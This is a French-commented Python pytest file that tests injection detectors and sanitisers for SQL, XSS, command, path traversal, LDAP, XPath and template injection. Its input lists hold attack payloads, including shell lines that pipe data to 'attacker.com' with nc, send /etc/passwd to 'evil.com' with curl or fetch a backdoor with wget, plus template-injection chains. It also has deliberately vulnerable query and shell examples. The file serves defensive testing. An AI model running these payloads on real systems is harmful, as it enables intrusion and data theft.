#!/usr/bin/env python3
"""
🛡️ Tests de sécurité critiques contre les injections
Tests pour SQL injection, XSS, Command injection, LDAP injection, etc.
"""

import pytest
import re
import html
import urllib.parse
import subprocess
import sqlite3
import os
import tempfile
import json
from unittest.mock import Mock, patch, MagicMock

# Mock des modules de base de données et autres dépendances
class MockDatabase:
    """Mock de base de données pour tester les injections SQL"""
    
    def __init__(self):
        self.connection = sqlite3.connect(':memory:')
        self.cursor = self.connection.cursor()
        self._setup_test_tables()
    
    def _setup_test_tables(self):
        """Créer des tables de test"""
        self.cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                role TEXT DEFAULT 'user'
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        # Insérer des données de test
        test_users = [
            (1, 'admin', 'admin_password', 'admin@jarvis.ai', 'admin'),
            (2, 'jarvis', 'jarvis_password', 'jarvis@stark.com', 'user'),
            (3, 'friday', 'friday_password', 'friday@stark.com', 'user')
        ]
        
        self.cursor.executemany(
            'INSERT INTO users (id, username, password, email, role) VALUES (?, ?, ?, ?, ?)',
            test_users
        )
        
        self.connection.commit()

    def execute_query(self, query, params=None):
        """Exécuter une requête (vulnérable ou sécurisée)"""
        if params:
            return self.cursor.execute(query, params).fetchall()
        else:
            return self.cursor.execute(query).fetchall()

    def close(self):
        """Fermer la connexion"""
        self.connection.close()


class MockHTTPResponse:
    """Mock de réponse HTTP pour tester XSS"""
    
    def __init__(self, content, content_type="text/html"):
        self.content = content
        self.content_type = content_type
        self.headers = {'Content-Type': content_type}


class TestSQLInjection:
    """Tests pour les injections SQL"""
    
    @pytest.fixture
    def db(self):
        """Fixture pour créer une base de données de test"""
        database = MockDatabase()
        yield database
        database.close()

    def test_basic_sql_injection_detection(self, db):
        """Test la détection d'injections SQL basiques"""
        malicious_inputs = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        def is_sql_injection_attempt(user_input):
            """Fonction simple de détection d'injection SQL"""
            dangerous_patterns = [
                r"('\s*(OR|AND)\s*'?\d*'?\s*=\s*'?\d*)",  # ' OR 1=1
                r"('\s*(OR|AND)\s*'[^']*'\s*=\s*'[^']*')",  # ' OR 'a'='a'
                r"(;\s*(DROP|DELETE|INSERT|UPDATE|CREATE|ALTER))",  # ; DROP TABLE
                r"(UNION\s+SELECT)",  # UNION SELECT
                r"(--|\#|/\*)",  # SQL comments
                r"(';\s*--)",  # '; --
                r"(\'\s*\))",  # ')
                r"(exec\s*\(|execute\s*\()",  # exec(
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            return False
        
        for malicious_input in malicious_inputs:
            assert is_sql_injection_attempt(malicious_input), \
                f"Failed to detect SQL injection: {malicious_input}"

    def test_parameterized_queries_prevent_injection(self, db):
        """Test que les requêtes paramétrées préviennent les injections"""
        malicious_username = "admin'; DROP TABLE users; --"
        
        # Requête vulnérable (à ne JAMAIS faire)
        vulnerable_query = f"SELECT * FROM users WHERE username = '{malicious_username}'"
        
        try:
            # Cette requête pourrait exécuter le DROP TABLE
            result_vulnerable = db.execute_query(vulnerable_query)
            # Si on arrive ici, l'injection pourrait avoir réussi
        except Exception as e:
            # L'exception est attendue pour une injection détectée
            pass
        
        # Requête sécurisée avec paramètres
        safe_query = "SELECT * FROM users WHERE username = ?"
        result_safe = db.execute_query(safe_query, (malicious_username,))
        
        # La requête sécurisée devrait retourner une liste vide (pas d'utilisateur avec ce nom)
        assert result_safe == [], "Parameterized query should not execute malicious code"
        
        # Vérifier que la table users existe encore
        tables_query = "SELECT name FROM sqlite_master WHERE type='table' AND name='users'"
        tables = db.execute_query(tables_query)
        assert len(tables) == 1, "Users table should still exist after injection attempt"

    def test_stored_procedure_injection(self, db):
        """Test les injections dans les procédures stockées"""
        # Simuler une procédure stockée vulnérable
        def vulnerable_user_lookup(username):
            query = f"SELECT * FROM users WHERE username = '{username}'"
            return db.execute_query(query)
        
        def safe_user_lookup(username):
            query = "SELECT * FROM users WHERE username = ?"
            return db.execute_query(query, (username,))
        
        injection_attempt = "admin' OR role='admin' --"
        
        # Test avec la procédure vulnérable
        try:
            vulnerable_result = vulnerable_user_lookup(injection_attempt)
            # Si l'injection réussit, elle pourrait retourner tous les admins
        except:
            vulnerable_result = []
        
        # Test avec la procédure sécurisée
        safe_result = safe_user_lookup(injection_attempt)
        
        # La procédure sécurisée ne devrait retourner aucun résultat
        assert len(safe_result) == 0, "Safe procedure should not be vulnerable to injection"

    def test_blind_sql_injection_detection(self, db):
        """Test la détection d'injections SQL aveugles"""
        def detect_blind_injection(user_input, response_time_threshold=1.0):
            """Détecter les tentatives d'injection SQL aveugle basées sur le temps"""
            time_based_patterns = [
                r"(;\s*WAITFOR\s+DELAY)",  # SQL Server
                r"(;\s*pg_sleep\s*\()",    # PostgreSQL
                r"(;\s*SLEEP\s*\()",       # MySQL
                r"(;\s*BENCHMARK\s*\()",   # MySQL
                r"(AND\s+\d+\s*=\s*\d+\s+AND\s+SLEEP\s*\()",  # Conditional delays
            ]
            
            for pattern in time_based_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            return False
        
        blind_injection_attempts = [
            "1; WAITFOR DELAY '00:00:05' --",
            "1 AND SLEEP(5) --",
            "1'; SELECT pg_sleep(5); --",
            "1 AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --",
            "1' AND BENCHMARK(5000000,MD5(1)) --"
        ]
        
        for attempt in blind_injection_attempts:
            assert detect_blind_injection(attempt), \
                f"Failed to detect blind SQL injection: {attempt}"

    def test_second_order_sql_injection(self, db):
        """Test les injections SQL de second ordre"""
        # Simuler l'insertion de données malicieuses qui pourraient être utilisées plus tard
        malicious_data = "admin'; UPDATE users SET role='admin' WHERE username='jarvis'; --"
        
        # Première étape : insérer les données (sécurisé)
        insert_query = "INSERT INTO users (username, password, email) VALUES (?, ?, ?)"
        db.execute_query(insert_query, (malicious_data, "password", "test@example.com"))
        
        # Deuxième étape : utiliser les données dans une autre requête (potentiellement vulnérable)
        def vulnerable_profile_update(username):
            # VULNERABLE: utiliser les données stockées dans une requête dynamique
            query = f"UPDATE users SET last_login=datetime('now') WHERE username='{username}'"
            return db.execute_query(query)
        
        def safe_profile_update(username):
            # SAFE: utiliser des paramètres même pour les données stockées
            query = "UPDATE users SET last_login=datetime('now') WHERE username=?"
            return db.execute_query(query, (username,))
        
        # Test avec la méthode sécurisée
        safe_profile_update(malicious_data)
        
        # Vérifier que l'utilisateur jarvis n'a pas été promu admin
        check_query = "SELECT role FROM users WHERE username='jarvis'"
        jarvis_role = db.execute_query(check_query)
        assert jarvis_role[0][0] == 'user', "Second-order injection should not succeed with safe code"

    def test_nosql_injection_detection(self):
        """Test la détection d'injections NoSQL"""
        def detect_nosql_injection(user_input):
            """Détecter les tentatives d'injection NoSQL"""
            nosql_patterns = [
                r"(\$gt|\$lt|\$eq|\$ne|\$in|\$nin)",  # MongoDB operators
                r"(\$where|\$regex|\$exists)",        # MongoDB query operators
                r"(;\s*return\s+true)",               # JavaScript injection
                r"(this\.)",                          # JavaScript this reference
                r"(\|\||\&\&)",                       # JavaScript logical operators
                r"(function\s*\()",                   # JavaScript functions
                r"(eval\s*\()",                       # JavaScript eval
            ]
            
            for pattern in nosql_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            return False
        
        nosql_injection_attempts = [
            '{"$gt": ""}',
            '{"$where": "this.username == this.password"}',
            'admin"; return true; var dummy="',
            '{"username": {"$regex": ".*"}}',
            'true, $where: "this.username == this.password"',
            'admin"; this.password.match(/.*/) || "',
            '{"username": "admin", "password": {"$gt": ""}}'
        ]
        
        for attempt in nosql_injection_attempts:
            assert detect_nosql_injection(attempt), \
                f"Failed to detect NoSQL injection: {attempt}"


class TestXSSPrevention:
    """Tests pour la prévention des attaques XSS"""
    
    def test_basic_xss_detection(self):
        """Test la détection d'attaques XSS basiques"""
        def detect_xss_attempt(user_input):
            """Détecter les tentatives XSS"""
            xss_patterns = [
                r"<script[^>]*>.*?</script>",              # Script tags
                r"javascript:",                            # JavaScript URLs
                r"on\w+\s*=",                             # Event handlers
                r"<iframe[^>]*>",                         # Iframe tags
                r"<object[^>]*>",                         # Object tags
                r"<embed[^>]*>",                          # Embed tags
                r"<form[^>]*>",                           # Form tags
                r"<img[^>]*onerror",                      # Image with onerror
                r"<svg[^>]*onload",                       # SVG with onload
                r"<body[^>]*onload",                      # Body with onload
                r"eval\s*\(",                             # eval function
                r"setTimeout\s*\(",                       # setTimeout
                r"setInterval\s*\(",                      # setInterval
                r"document\.",                            # document object
                r"window\.",                              # window object
                r"location\.",                            # location object
            ]
            
            for pattern in xss_patterns:
                if re.search(pattern, user_input, re.IGNORECASE | re.DOTALL):
                    return True
            return False
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload='alert(1)'>",
            "<div onclick='alert(1)'>Click me</div>",
            "<input onfocus='alert(1)' autofocus>",
            "<select onfocus='alert(1)' autofocus>",
            "<textarea onfocus='alert(1)' autofocus>",
            "<keygen onfocus='alert(1)' autofocus>",
            "<video><source onerror='alert(1)'>",
            "<audio src='x' onerror='alert(1)'>",
            "<details open ontoggle='alert(1)'>",
            "<marquee onstart='alert(1)'>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "</title><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com'</script>"
        ]
        
        for payload in xss_payloads:
            assert detect_xss_attempt(payload), \
                f"Failed to detect XSS payload: {payload}"

    def test_html_sanitization(self):
        """Test la sanitisation HTML pour prévenir XSS"""
        def sanitize_html(user_input):
            """Sanitiser l'entrée HTML"""
            # Échapper les caractères HTML dangereux
            sanitized = html.escape(user_input)
            
            # Supprimer complètement les balises script
            sanitized = re.sub(r'<script[^>]*>.*?</script>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)
            
            # Supprimer les gestionnaires d'événements
            sanitized = re.sub(r'\son\w+\s*=\s*["\'][^"\']*["\']', '', sanitized, flags=re.IGNORECASE)
            
            # Supprimer les URLs javascript:
            sanitized = re.sub(r'javascript:', '', sanitized, flags=re.IGNORECASE)
            
            return sanitized
        
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "javascript:alert('XSS')",
            "<div onclick='alert(1)'>test</div>",
            '"><script>alert("XSS")</script>'
        ]
        
        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_html(dangerous_input)
            
            # Vérifier que les éléments dangereux ont été supprimés/échappés
            assert '<script>' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
            assert 'onclick=' not in sanitized.lower()

    def test_content_security_policy_validation(self):
        """Test la validation des en-têtes Content Security Policy"""
        def validate_csp_header(csp_header):
            """Valider un en-tête CSP"""
            required_directives = [
                'default-src',
                'script-src',
                'style-src',
                'img-src',
                'connect-src',
                'font-src',
                'object-src',
                'media-src',
                'frame-src'
            ]
            
            # Vérifier la présence des directives importantes
            for directive in required_directives:
                if directive not in csp_header:
                    return False, f"Missing directive: {directive}"
            
            # Vérifier qu'il n'y a pas de 'unsafe-inline' ou 'unsafe-eval'
            if "'unsafe-inline'" in csp_header:
                return False, "Contains unsafe-inline"
            
            if "'unsafe-eval'" in csp_header:
                return False, "Contains unsafe-eval"
            
            # Vérifier qu'il n'y a pas de wildcard dans script-src
            if "script-src" in csp_header and "*" in csp_header:
                return False, "Wildcard in script-src is dangerous"
            
            return True, "CSP header is valid"
        
        # CSP sécurisé
        secure_csp = (
            "default-src 'self'; "
            "script-src 'self' 'nonce-random123'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "connect-src 'self' wss: https:; "
            "font-src 'self' https://fonts.gstatic.com; "
            "object-src 'none'; "
            "media-src 'self'; "
            "frame-src 'none'"
        )
        
        # CSP non sécurisé
        insecure_csp = (
            "default-src *; "
            "script-src * 'unsafe-inline' 'unsafe-eval'; "
            "object-src *"
        )
        
        is_valid, message = validate_csp_header(secure_csp)
        assert is_valid, f"Secure CSP should be valid: {message}"
        
        is_valid, message = validate_csp_header(insecure_csp)
        assert not is_valid, f"Insecure CSP should be invalid: {message}"

    def test_dom_xss_detection(self):
        """Test la détection de XSS DOM"""
        dangerous_dom_operations = [
            "document.write(",
            "innerHTML =",
            "outerHTML =",
            "eval(",
            "setTimeout(",
            "setInterval(",
            "Function(",
            "location.href =",
            "location.replace(",
            "location.assign(",
            "document.domain =",
            "window.name =",
            "history.pushState(",
            "history.replaceState("
        ]
        
        def contains_dangerous_dom_operation(code):
            """Vérifier si le code contient des opérations DOM dangereuses"""
            for operation in dangerous_dom_operations:
                if operation in code:
                    return True
            return False
        
        dangerous_code_samples = [
            "document.write('<script>alert(1)</script>');",
            "element.innerHTML = userInput;",
            "eval('alert(' + userInput + ')');",
            "setTimeout('alert(' + userInput + ')', 1000);",
            "location.href = 'javascript:alert(1)';",
            "new Function('alert(' + userInput + ')')();"
        ]
        
        for code in dangerous_code_samples:
            assert contains_dangerous_dom_operation(code), \
                f"Failed to detect dangerous DOM operation in: {code}"


class TestCommandInjection:
    """Tests pour les injections de commandes"""
    
    def test_command_injection_detection(self):
        """Test la détection d'injections de commandes"""
        def detect_command_injection(user_input):
            """Détecter les tentatives d'injection de commandes"""
            dangerous_chars = [';', '&', '|', '$', '`', '(', ')', '{', '}', '<', '>', '*', '?', '[', ']', '!', '#']
            dangerous_commands = [
                'rm', 'del', 'format', 'fdisk', 'mkfs', 'dd',
                'nc', 'netcat', 'telnet', 'ssh', 'ftp',
                'wget', 'curl', 'ping', 'nslookup', 'dig',
                'ps', 'kill', 'killall', 'pkill',
                'cat', 'less', 'more', 'head', 'tail',
                'find', 'locate', 'which', 'whereis',
                'chmod', 'chown', 'chgrp', 'sudo', 'su',
                'python', 'perl', 'ruby', 'php', 'sh', 'bash', 'zsh',
                'eval', 'exec', 'system'
            ]
            
            # Vérifier les caractères dangereux
            for char in dangerous_chars:
                if char in user_input:
                    return True
            
            # Vérifier les commandes dangereuses
            for command in dangerous_commands:
                if re.search(r'\b' + re.escape(command) + r'\b', user_input, re.IGNORECASE):
                    return True
            
            return False
        
        injection_attempts = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "file.txt `whoami`",
            "file.txt $(ls -la)",
            "file.txt & python -c 'import os; os.system(\"rm -rf /\")'",
            "test; curl http://evil.com/steal.php?data=$(cat /etc/passwd)",
            "input > /dev/null; wget http://malware.com/backdoor.sh",
            "data || ping -c 1 attacker.com",
            "filename.txt; shutdown -h now"
        ]
        
        for attempt in injection_attempts:
            assert detect_command_injection(attempt), \
                f"Failed to detect command injection: {attempt}"

    def test_safe_command_execution(self):
        """Test l'exécution sécurisée de commandes"""
        def unsafe_command_execution(filename):
            """Méthode non sécurisée (à ne jamais utiliser)"""
            # DANGEREUX: construction de commande avec des données utilisateur
            command = f"ls -la {filename}"
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout
            except:
                return "Error"
        
        def safe_command_execution(filename):
            """Méthode sécurisée avec validation et paramètres"""
            # Valider l'entrée
            if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
                raise ValueError("Invalid filename")
            
            # Utiliser une liste de paramètres au lieu d'une chaîne
            try:
                result = subprocess.run(['ls', '-la', filename], capture_output=True, text=True, timeout=5)
                return result.stdout
            except subprocess.TimeoutExpired:
                return "Command timeout"
            except:
                return "Error"
        
        # Test avec un nom de fichier malicieux
        malicious_filename = "test.txt; rm important_file"
        
        # La méthode sécurisée devrait rejeter l'entrée
        with pytest.raises(ValueError):
            safe_command_execution(malicious_filename)
        
        # Test avec un nom de fichier valide
        valid_filename = "test.txt"
        result = safe_command_execution(valid_filename)
        # Le résultat devrait être une chaîne (même si le fichier n'existe pas)
        assert isinstance(result, str)

    def test_path_traversal_prevention(self):
        """Test la prévention de path traversal"""
        def detect_path_traversal(file_path):
            """Détecter les tentatives de path traversal"""
            dangerous_patterns = [
                r'\.\.',           # Parent directory
                r'\.\\',           # Windows path traversal
                r'\./',            # Unix path traversal
                r'%2e%2e',         # URL encoded ..
                r'%2f',            # URL encoded /
                r'%5c',            # URL encoded \
                r'\\\\',           # UNC paths
                r'/etc/',          # System directories
                r'/proc/',
                r'/sys/',
                r'/dev/',
                r'C:\\',           # Windows system drives
                r'\\windows\\',
                r'\\system32\\'
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, file_path, re.IGNORECASE):
                    return True
            return False
        
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2froot%2f.ssh%2fid_rsa",
            "....//....//....//etc//passwd",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "....\\/....\\/....\\/etc\\/passwd"
        ]
        
        for attempt in path_traversal_attempts:
            assert detect_path_traversal(attempt), \
                f"Failed to detect path traversal: {attempt}"

    def test_filename_validation(self):
        """Test la validation de noms de fichiers"""
        def validate_filename(filename):
            """Valider un nom de fichier"""
            # Caractères interdits
            forbidden_chars = ['/', '\\', ':', '*', '?', '"', '<', '>', '|', ';', '&', '$', '`']
            
            # Vérifier les caractères interdits
            for char in forbidden_chars:
                if char in filename:
                    return False, f"Forbidden character: {char}"
            
            # Vérifier les noms de fichiers réservés (Windows)
            reserved_names = ['CON', 'PRN', 'AUX', 'NUL'] + [f'COM{i}' for i in range(1, 10)] + [f'LPT{i}' for i in range(1, 10)]
            if filename.upper() in reserved_names:
                return False, f"Reserved filename: {filename}"
            
            # Vérifier la longueur
            if len(filename) > 255:
                return False, "Filename too long"
            
            # Vérifier qu'il ne commence/finit pas par des points ou espaces
            if filename.startswith('.') or filename.endswith('.') or filename.startswith(' ') or filename.endswith(' '):
                return False, "Invalid filename format"
            
            return True, "Valid filename"
        
        valid_filenames = [
            "document.txt",
            "image_2023.jpg",
            "data-file.csv",
            "report_v1.2.pdf"
        ]
        
        invalid_filenames = [
            "../secret.txt",
            "file|command.txt",
            "CON.txt",  # Windows reserved
            "test*.txt",
            "file?.txt",
            "file<script>.txt",
            ".hidden_start",
            "ends_with_dot.",
            " starts_with_space.txt",
            "a" * 300 + ".txt"  # Too long
        ]
        
        for filename in valid_filenames:
            is_valid, message = validate_filename(filename)
            assert is_valid, f"Valid filename rejected: {filename} - {message}"
        
        for filename in invalid_filenames:
            is_valid, message = validate_filename(filename)
            assert not is_valid, f"Invalid filename accepted: {filename}"


class TestLDAPInjection:
    """Tests pour les injections LDAP"""
    
    def test_ldap_injection_detection(self):
        """Test la détection d'injections LDAP"""
        def detect_ldap_injection(user_input):
            """Détecter les tentatives d'injection LDAP"""
            ldap_chars = ['(', ')', '*', '\\', '/', '+', '=', '<', '>', '"', "'", ';', ',', '#']
            ldap_operators = ['&', '|', '!']
            
            # Vérifier les caractères spéciaux LDAP
            for char in ldap_chars:
                if char in user_input:
                    return True
            
            # Vérifier les opérateurs logiques LDAP
            for op in ldap_operators:
                if op in user_input:
                    return True
            
            # Patterns d'injection LDAP spécifiques
            injection_patterns = [
                r'\*\)',           # *)
                r'\)\(',           # )(
                r'\|\|',           # ||
                r'&\(',            # &(
                r'\|\(',           # |(
                r'!\(',            # !(
                r'objectClass=',   # objectClass query
                r'cn=',            # Common Name query
                r'uid=',           # User ID query
                r'sAMAccountName=' # Windows Active Directory
            ]
            
            for pattern in injection_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            
            return False
        
        ldap_injection_attempts = [
            "*)",
            "admin)(&(password=*))",
            "admin)(|(password=*))",
            "admin)(!(&(password=*)))",
            "*)(objectClass=*)",
            "*)(cn=*)",
            "*)(uid=*)",
            "admin)(objectClass=user))",
            "*)(|(cn=*)(mail=*))",
            "admin)(&(|(userPassword=*)(password=*))",
            "*)(sAMAccountName=*)"
        ]
        
        for attempt in ldap_injection_attempts:
            assert detect_ldap_injection(attempt), \
                f"Failed to detect LDAP injection: {attempt}"

    def test_ldap_filter_sanitization(self):
        """Test la sanitisation des filtres LDAP"""
        def sanitize_ldap_input(user_input):
            """Sanitiser l'entrée pour LDAP"""
            # Mappage des caractères à échapper
            escape_map = {
                '\\': '\\5c',
                '*': '\\2a',
                '(': '\\28',
                ')': '\\29',
                '\x00': '\\00'
            }
            
            sanitized = user_input
            for char, escaped in escape_map.items():
                sanitized = sanitized.replace(char, escaped)
            
            return sanitized
        
        dangerous_inputs = [
            "admin*",
            "user(test)",
            "test\\injection",
            "admin)(password=*",
            "test\x00null"
        ]
        
        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_ldap_input(dangerous_input)
            
            # Vérifier que les caractères dangereux ont été échappés
            assert '*' not in sanitized or '\\2a' in sanitized
            assert '(' not in sanitized or '\\28' in sanitized
            assert ')' not in sanitized or '\\29' in sanitized
            assert '\\' not in sanitized or '\\5c' in sanitized


class TestXPathInjection:
    """Tests pour les injections XPath"""
    
    def test_xpath_injection_detection(self):
        """Test la détection d'injections XPath"""
        def detect_xpath_injection(user_input):
            """Détecter les tentatives d'injection XPath"""
            xpath_chars = ["'", '"', '[', ']', '(', ')', '=', '!', '<', '>', '/', '@', '*']
            xpath_functions = [
                'substring', 'string-length', 'normalize-space', 'translate',
                'contains', 'starts-with', 'ends-with', 'position', 'last',
                'count', 'sum', 'concat', 'boolean', 'not', 'true', 'false'
            ]
            
            # Vérifier les caractères XPath
            special_char_count = sum(1 for char in xpath_chars if char in user_input)
            if special_char_count > 2:  # Tolérer quelques caractères spéciaux
                return True
            
            # Vérifier les fonctions XPath
            for func in xpath_functions:
                if func + '(' in user_input.lower():
                    return True
            
            # Patterns d'injection XPath spécifiques
            injection_patterns = [
                r"'\s*or\s*'",         # ' or '
                r'"\s*or\s*"',         # " or "
                r"'\s*and\s*'",        # ' and '
                r'"\s*and\s*"',        # " and "
                r"\[\s*\d+\s*=\s*\d+\s*\]",  # [1=1]
                r"//",                 # Absolute path
                r"\.\./",              # Parent navigation
                r"@\w+",               # Attribute access
                r"text\(\)",           # text() function
                r"node\(\)"            # node() function
            ]
            
            for pattern in injection_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            
            return False
        
        xpath_injection_attempts = [
            "admin' or '1'='1",
            '" or "1"="1',
            "user[1=1]",
            "admin' and substring(password,1,1)='a",
            "//user[position()=1]",
            "admin' or contains(password,'pass')",
            "test' or string-length(password)>0 or '1'='1",
            "user/../admin",
            "admin' or @role='admin' or '1'='1",
            "' or text()='admin' or '1'='1"
        ]
        
        for attempt in xpath_injection_attempts:
            assert detect_xpath_injection(attempt), \
                f"Failed to detect XPath injection: {attempt}"


class TestTemplateInjection:
    """Tests pour les injections de templates (SSTI)"""
    
    def test_template_injection_detection(self):
        """Test la détection d'injections de templates"""
        def detect_template_injection(user_input):
            """Détecter les tentatives d'injection de templates"""
            # Syntaxes de templates courantes
            template_patterns = [
                r'\{\{.*\}\}',         # Jinja2, Handlebars
                r'\{%.*%\}',           # Jinja2, Django
                r'\$\{.*\}',           # Velocity, Freemarker
                r'<%.*%>',             # JSP, ERB
                r'\{\{.*\|.*\}\}',     # Jinja2 filters
                r'\{\{.*\..*\}\}',     # Object access
                r'\{\{.*\[.*\].*\}\}', # Array access
                r'__.*__',             # Python special methods
                r'constructor',        # Constructor access
                r'prototype',          # Prototype pollution
                r'process\.env',       # Environment variables
                r'global\.',           # Global object access
                r'this\.',             # This context
                r'self\.',             # Self reference
                r'config\.',           # Configuration access
                r'request\.',          # Request object
                r'session\.',          # Session object
                r'app\.',              # Application object
            ]
            
            for pattern in template_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    return True
            
            # Fonctions dangereuses
            dangerous_functions = [
                'eval', 'exec', 'compile', 'open', 'file', '__import__',
                'getattr', 'setattr', 'delattr', 'hasattr',
                'vars', 'dir', 'locals', 'globals',
                'input', 'raw_input', 'reload'
            ]
            
            for func in dangerous_functions:
                if func in user_input:
                    return True
            
            return False
        
        template_injection_attempts = [
            "{{7*7}}",
            "{{''.join(chr(i) for i in [95,95,105,109,112,111,114,116,95,95])}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${7*7}",
            "<%=7*7%>",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.environ}}",
            "{{session.get('user')}}",
            "{%for item in ().__class__.__bases__[0].__subclasses__()%}",
            "{{lipsum.__globals__['os'].listdir('.')}}",
            "${product.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')}",
            "{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
        ]
        
        for attempt in template_injection_attempts:
            assert detect_template_injection(attempt), \
                f"Failed to detect template injection: {attempt}"

    def test_template_sandboxing(self):
        """Test le sandboxing des templates"""
        def create_safe_template_environment():
            """Créer un environnement de template sécurisé"""
            # Simuler un environnement Jinja2 sécurisé
            blocked_attributes = [
                '__class__', '__mro__', '__subclasses__', '__globals__',
                '__builtins__', '__import__', '__file__', '__name__',
                'func_globals', 'func_code', 'gi_frame', 'gi_code',
                'cr_frame', 'cr_code'
            ]
            
            blocked_functions = [
                'eval', 'exec', 'compile', 'open', 'file', '__import__',
                'getattr', 'setattr', 'delattr', 'hasattr',
                'vars', 'dir', 'locals', 'globals', 'input'
            ]
            
            return {
                'blocked_attributes': blocked_attributes,
                'blocked_functions': blocked_functions,
                'safe_mode': True
            }
        
        def is_template_safe(template_string, environment):
            """Vérifier si un template est sûr"""
            if not environment.get('safe_mode', False):
                return False
            
            # Vérifier les attributs bloqués
            for attr in environment['blocked_attributes']:
                if attr in template_string:
                    return False
            
            # Vérifier les fonctions bloquées
            for func in environment['blocked_functions']:
                if func in template_string:
                    return False
            
            return True
        
        safe_env = create_safe_template_environment()
        
        safe_templates = [
            "Hello {{name}}!",
            "The total is {{price * quantity}}",
            "{{products|length}} items found",
            "Welcome {{user.name}}!"
        ]
        
        dangerous_templates = [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].listdir('.')}}",
            "{{request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}"
        ]
        
        for template in safe_templates:
            assert is_template_safe(template, safe_env), \
                f"Safe template rejected: {template}"
        
        for template in dangerous_templates:
            assert not is_template_safe(template, safe_env), \
                f"Dangerous template accepted: {template}"


# Tests d'intégration pour la détection multi-injection
class TestMultiInjectionDetection:
    """Tests pour détecter plusieurs types d'injection simultanément"""
    
    def test_combined_injection_detection(self):
        """Test la détection d'injections combinées"""
        def detect_any_injection(user_input):
            """Détecter tout type d'injection"""
            detectors = [
                self._detect_sql_injection,
                self._detect_xss,
                self._detect_command_injection,
                self._detect_ldap_injection,
                self._detect_xpath_injection,
                self._detect_template_injection
            ]
            
            for detector in detectors:
                if detector(user_input):
                    return True
            
            return False
        
        combined_injection_attempts = [
            "'; DROP TABLE users; <script>alert('XSS')</script> --",
            "admin' OR 1=1; rm -rf / && {{7*7}}",
            "test*)(objectClass=*) & curl http://evil.com",
            "<img src='x' onerror='{{config.items()}}'>"
        ]
        
        for attempt in combined_injection_attempts:
            assert detect_any_injection(attempt), \
                f"Failed to detect combined injection: {attempt}"
    
    def _detect_sql_injection(self, user_input):
        """Détection SQL injection simplifiée"""
        patterns = [r"('\s*(OR|AND)\s*'?\d*'?\s*=\s*'?\d*)", r"(;\s*(DROP|DELETE|INSERT|UPDATE))"]
        return any(re.search(pattern, user_input, re.IGNORECASE) for pattern in patterns)
    
    def _detect_xss(self, user_input):
        """Détection XSS simplifiée"""
        patterns = [r"<script[^>]*>", r"javascript:", r"on\w+\s*="]
        return any(re.search(pattern, user_input, re.IGNORECASE) for pattern in patterns)
    
    def _detect_command_injection(self, user_input):
        """Détection command injection simplifiée"""
        dangerous_chars = [';', '&', '|', '$', '`']
        return any(char in user_input for char in dangerous_chars)
    
    def _detect_ldap_injection(self, user_input):
        """Détection LDAP injection simplifiée"""
        ldap_chars = ['*', '(', ')', '\\']
        return any(char in user_input for char in ldap_chars)
    
    def _detect_xpath_injection(self, user_input):
        """Détection XPath injection simplifiée"""
        patterns = [r"'\s*or\s*'", r'"\s*or\s*"', r"\[\s*\d+\s*=\s*\d+\s*\]"]
        return any(re.search(pattern, user_input, re.IGNORECASE) for pattern in patterns)
    
    def _detect_template_injection(self, user_input):
        """Détection template injection simplifiée"""
        patterns = [r'\{\{.*\}\}', r'\{%.*%\}', r'\$\{.*\}']
        return any(re.search(pattern, user_input, re.IGNORECASE) for pattern in patterns)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])